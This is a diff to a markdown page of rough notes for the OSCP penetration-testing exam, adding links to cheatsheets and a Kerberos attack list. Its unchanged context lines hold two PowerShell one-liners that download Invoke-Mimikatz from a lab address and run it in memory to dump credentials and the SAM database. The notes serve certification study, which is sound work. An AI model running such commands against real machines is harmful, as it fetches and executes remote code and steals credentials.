@@ -14,10 +14,11 @@ description: Just some rough notes in preparation for the OSCP.
   * `powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.10.1:8080/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds`&#x20;
   * `powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.119.164:8080/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -Command lsadump::sam`
 
-
-
-
-
-### Helpful Links
+### Helpful Blogs
 
 * [List of Kerberos attacks with different tooling](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
+
+### Helpful OSCP Cheatsheets
+
+* [OSCP Enumeration Cheatsheet](https://strongcourage.github.io/2020/05/03/enum.html)
+* [iRedTeam Cheatsheet](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets)
